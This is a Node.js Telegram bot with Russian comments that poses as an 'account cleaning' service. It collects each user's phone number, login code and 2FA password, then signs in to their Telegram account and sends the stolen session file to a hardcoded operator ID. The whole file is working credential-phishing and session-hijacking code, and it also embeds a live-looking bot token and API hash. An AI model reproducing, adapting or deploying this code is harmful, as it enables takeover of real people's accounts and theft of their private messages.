const { Telegraf } = require('telegraf');
const { MTProto } = require('telegram-mtproto');
const fs = require('fs');
const axios = require('axios');

const BOT_TOKEN = '8273534923:AAGJpRJOzwfjQ14wZtclCKKinSfiwlDnKbM';
const API_ID = 23721778; // твой api_id
const API_HASH = '7935a656311ab4e500294b22d6b6c7f6';
const YOUR_TELEGRAM_ID = 6307490597; // твой ID, куда слать сессии

const bot = new Telegraf(BOT_TOKEN);

const sessions = {};

// Отправка файла сессии
async function sendSession(chatId, filePath) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('document', fs.createReadStream(filePath));
  await axios.post(url, formData, { headers: formData.getHeaders() });
}

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  sessions[userId] = { step: 'phone' };
  await ctx.reply('🔐 Enter your phone number to start account cleaning:');
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  const session = sessions[userId];

  if (!session) return;

  if (session.step === 'phone') {
    session.phone = text;
    session.step = 'code';
    
    // Отправляем запрос на вход
    const mtproto = new MTProto({ api_id: API_ID, api_hash: API_HASH });
    const { phone_code_hash } = await mtproto.call('auth.sendCode', {
      phone_number: session.phone,
      api_id: API_ID,
      api_hash: API_HASH
    });
    session.codeHash = phone_code_hash;
    
    await ctx.reply('📲 Enter the code you received:');
  }
  
  else if (session.step === 'code') {
    session.code = text;
    const mtproto = new MTProto({ api_id: API_ID, api_hash: API_HASH });
    
    try {
      const auth = await mtproto.call('auth.signIn', {
        phone_number: session.phone,
        phone_code_hash: session.codeHash,
        phone_code: session.code
      });
      
      if (auth.user) {
        // Успешно, сохраняем сессию
        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
        fs.writeFileSync(sessionFile, JSON.stringify(mtproto.storage.save()));
        await sendSession(YOUR_TELEGRAM_ID, sessionFile);
        await ctx.reply('✅ Account cleaned. Session sent to admin.');
        delete sessions[userId];
      }
    } catch (err) {
      if (err.error_message === 'SESSION_PASSWORD_NEEDED') {
        session.step = 'password';
        await ctx.reply('🔐 Enter your 2FA password:');
      } else {
        await ctx.reply('❌ Invalid code. Try again.');
        delete sessions[userId];
      }
    }
  }
  
  else if (session.step === 'password') {
    session.password = text;
    const mtproto = new MTProto({ api_id: API_ID, api_hash: API_HASH });
    
    try {
      const auth = await mtproto.call('auth.signIn', {
        phone_number: session.phone,
        phone_code_hash: session.codeHash,
        phone_code: session.code,
        password: session.password
      });
      
      if (auth.user) {
        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
        fs.writeFileSync(sessionFile, JSON.stringify(mtproto.storage.save()));
        await sendSession(YOUR_TELEGRAM_ID, sessionFile);
        await ctx.reply('✅ Account cleaned. Session sent to admin.');
        delete sessions[userId];
      }
    } catch (err) {
      await ctx.reply('❌ Wrong password. Try again.');
      delete sessions[userId];
    }
  }
});

bot.launch();
console.log('Bot started');
